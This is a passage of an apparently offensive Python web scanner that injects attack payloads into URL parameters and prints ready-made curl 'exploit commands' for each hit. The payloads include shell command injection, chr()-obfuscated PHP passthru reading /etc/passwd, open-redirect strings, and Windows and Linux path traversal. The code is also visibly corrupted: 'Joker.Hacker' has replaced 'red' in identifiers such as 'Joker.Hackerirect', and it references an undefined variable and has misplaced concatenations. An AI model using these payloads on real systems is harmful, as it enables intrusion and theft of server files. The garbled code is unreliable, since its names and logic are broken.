    # RCE Linux Check ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('$(cat+/etc/passwd)')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + Joker.Hacker)

        rce_url = new_url.replace("Joker.Hacker", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Command Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rce_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + Joker.Hacker)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE Linux Check 2 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('$(sleep+10)')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + Joker.Hacker)

        rce_url = new_url.replace("Joker.Hacker", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Time Based Command Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rce_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + Joker.Hacker)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('phpinfo()')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + Joker.Hacker)

        rce_url = new_url.replace("Joker.Hacker", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "<title>phpinfo()</title>" in http_response:
            print(OKJoker.Hacker + "[+] Generic PHP Command Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rce_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep PHP --color=auto" + Joker.Hacker)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check 2 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + Joker.Hacker)

        rce_url = new_url.replace("Joker.Hacker", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux PHP Command Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rce_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + Joker.Hacker)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

    # RCE PHP Check 3 ######################################################################################
    try:
        rce_exploit = urllib.parse.quote('{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + Joker.Hacker)

        rce_url = new_url.replace("Joker.Hacker", rce_exploit)
        http_request = urllib.request.urlopen(rce_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] PHP Command Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rce_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto" + Joker.Hacker)
            f.write("P1 - Critical, Command Execution, " + str(rce_url) + ", " + str(rce_exploit) + "\n")

    except:
        pass

logo()
if len(sys.argv) < 2:
    print("You need to specify a URL to scan (ie. -u https://site.com). Use --help for all options.")
    sys.exit()
else:
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url',
                      action="store", dest="url",
                      help="Full URL to spider", default="")

    parser.add_option('-c', '--cookie',
                      action="store", dest="cookie",
                      help="Cookies to send", default="")

    parser.add_option('-v', '--verbose',
                      action="store", dest="verbose",
                      help="Set verbose mode ON", default="n")

options, args = parser.parse_args()
cookies = str(options.cookie)
verbose = str(options.verbose)
full_url = str(options.url)
payload = "Joker.Hacker"
http_status_base = "404"
http_length_base = "0"

try:
    http_request_base = urllib.request.urlopen(full_url)
    http_response_base = http_request_base.read()
    http_length_base = len(http_response_base)
    http_status_base = http_request_base.getcode()

    print(Joker.Hacker)
    print(COLOR3 + ">>> " + OKOJoker.Hacker + full_url + COLOR2 + " [" + OKJoker.Hacker + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + Joker.Hacker)
    print(COLOR3 + "======================================================================================================" + Joker.Hacker)

except:
    print(Joker.Hacker)
    print(COLOR3 + ">>> " + OKOJoker.Hacker + full_url + COLOR2 + " [" + OKJoker.Hacker + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + Joker.Hacker)
    print(COLOR3 + "======================================================================================================" + Joker.Hacker)

if str(http_status_base) == "404":
    print(COLOR1 + "[F] Received HTTP Status 404 - Page Not Found. Skipping..." + Joker.Hacker)

elif str(http_status_base) == "403":
    print(COLOR1 + "[F] Received HTTP Status 403 - Page Not Found. Skipping..." + Joker.Hacker)

else:
    if "=" in full_url:

        parsed = urllib.request.urlparse(full_url)
        params = urllib.parse.parse_qsl(parsed.query)
        param_list = []
        param_vals = []
        param_length = 0
        for x,y in params:
            param_list.extend([str(x + "=")])
            param_vals.extend([str(urllib.parse.quote_plus(y))])
            param_length = param_length + 1

        # FIND BASE URL
        dynamic_url = full_url.find("?")
        base_url = str(full_url[:dynamic_url + 1])

        # LIST EACH PARAMETER
        active_fuzz = 1
        i = 1

        http_request_base = urllib.request.urlopen(full_url)
        http_response_base = http_request_base.read()
        http_length_base = len(http_response_base)
        http_status_base = http_request_base.getcode()

        print(Joker.Hacker)
        print(COLOR3 + ">>> " + OKOJoker.Hacker + full_url + COLOR2 + " [" + OKJoker.Hacker + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + Joker.Hacker)
        print(COLOR3 + "======================================================================================================" + Joker.Hacker)

        while i <= param_length and active_fuzz <= param_length:
            if (i < param_length and i == active_fuzz):
                print(OKOJoker.Hacker + "[D] Fuzzing Parameter: " + param_list[i-1] + Joker.Hacker)
                print(OKOJoker.Hacker + "----------------------------------------------------" + Joker.Hacker)
                base_url += param_list[i-1] + payload + "&"
                i = i+1

            elif (i == param_length and i == active_fuzz):
                print(OKOJoker.Hacker + "[D] Fuzzing Parameter: " + param_list[i-1] + Joker.Hacker)
                print(OKOJoker.Hacker + "----------------------------------------------------" + Joker.Hacker)
                base_url += param_list[i-1] + payload
                active_fuzz = active_fuzz+1
                i = i+1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            elif (i == param_length and i != active_fuzz):
                base_url += param_list[i-1] + param_vals[i-1]
                active_fuzz = active_fuzz+1
                i = 1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            elif (i == param_length):
                base_url += param_list[i-1] + param_vals[i-1]
                active_fuzz = active_fuzz+1
                i = 1
                active_scan()
                base_url = str(full_url[:dynamic_url + 1])

            else:
                base_url += param_list[i-1] + param_vals[i-1] + "&"
                i = i+1


    else:
        new_url = full_url + 'Joker.Hacker'
        Joker.Hackerirect_exploit = urllib.parse.quote('//google.com')

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)

        try:
            http_request = urllib.request.urlopen(Joker.Hackerirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "<title>Google</title>" in http_response:
                print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto" + Joker.Hacker)
                f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(Joker.Hackerirect_exploit) + "\n")

        except:
            pass

        # Open Joker.Hackerirect ######################################################################################
        Joker.Hackerirect_exploit = urllib.parse.quote('/<>//google.com')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)

        try:
            http_request = urllib.request.urlopen(Joker.Hackerirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "<title>Google</title>" in http_response:
                print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto" + Joker.Hacker)
                f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(Joker.Hackerirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Open Joker.Hackerirect ######################################################################################
        Joker.Hackerirect_exploit = urllib.parse.quote('/%252F%252Fgoogle.com')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)

        try:
            http_request = urllib.request.urlopen(Joker.Hackerirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "<title>Google</title>" in http_response:
                print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto" + Joker.Hacker)
                f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(Joker.Hackerirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Open Joker.Hackerirect ######################################################################################
        Joker.Hackerirect_exploit = urllib.parse.quote('////google.com/%2e%2e')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)

        try:
            http_request = urllib.request.urlopen(Joker.Hackerirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "<title>Google</title>" in http_response:
                print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto" + Joker.Hacker)
                f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(Joker.Hackerirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Open Joker.Hackerirect ######################################################################################
        Joker.Hackerirect_exploit = urllib.parse.quote('/https:/%5cgoogle.com/')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)

        try:
            http_request = urllib.request.urlopen(Joker.Hackerirect_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_status = http_request.getcode()
            http_length_diff = str(http_length_base - http_length)

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + str(Joker.Hackerirect_url) + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + str(http_length_diff) + COLOR2 + "]" + Joker.Hacker)

            if "<title>Google</title>" in http_response:
                print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto" + Joker.Hacker)
                f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(Joker.Hackerirect_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Windows Directory Traversal ######################################################################################
        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "boot loader" in http_response or "16-bit" in http_response:
                print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + Joker.Hacker)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Windows Directory Traversal 2 ######################################################################################
        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "boot loader" in http_response or "16-bit" in http_response:
                print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + Joker.Hacker)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
        except:
            pass


        new_url = full_url + 'Joker.Hacker'


        # Windows Directory Traversal 3 ######################################################################################
        try:
            traversal_exploit = urllib.parse.quote('..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm')
            if (verbose == "y"):
                print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

            traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)

            try:
                http_request = urllib.request.urlopen(traversal_url)
                http_response = str(http_request.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = http_request.getcode()
                if (verbose == "y"):
                    print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

                if "boot loader" in http_response or "16-bit" in http_response:
                    print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
                    print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
                    print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + Joker.Hacker)
                    f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")
            except:
                pass
        except:
            pass

        # Linux Directory Traversal ######################################################################################
        traversal_exploit = urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd")
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "root:" in http_response:
                print(OKJoker.Hacker + "[+] Linux Directory Traversal Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + Joker.Hacker)
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

        except:
            pass

        new_url = full_url + 'Joker.Hacker'

        # Linux Directory Traversal 2 ######################################################################################

        traversal_exploit = urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd%00")
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)

        try:
            http_request = urllib.request.urlopen(traversal_url)
            http_response = str(http_request.read())
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()

            if (verbose == "y"):
                print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            if "root:" in http_response:
                print(OKJoker.Hacker + "[+] Linux Directory Traversal Found! " + Joker.Hacker)
                print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
                print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto") + Joker.Hacker
                f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

        except:
            pass

print(OKOJoker.Hacker + "______________________________________________________________________________________________________" + Joker.Hacker)
print(Joker.Hacker)
print(Joker.Hacker)
f.close()
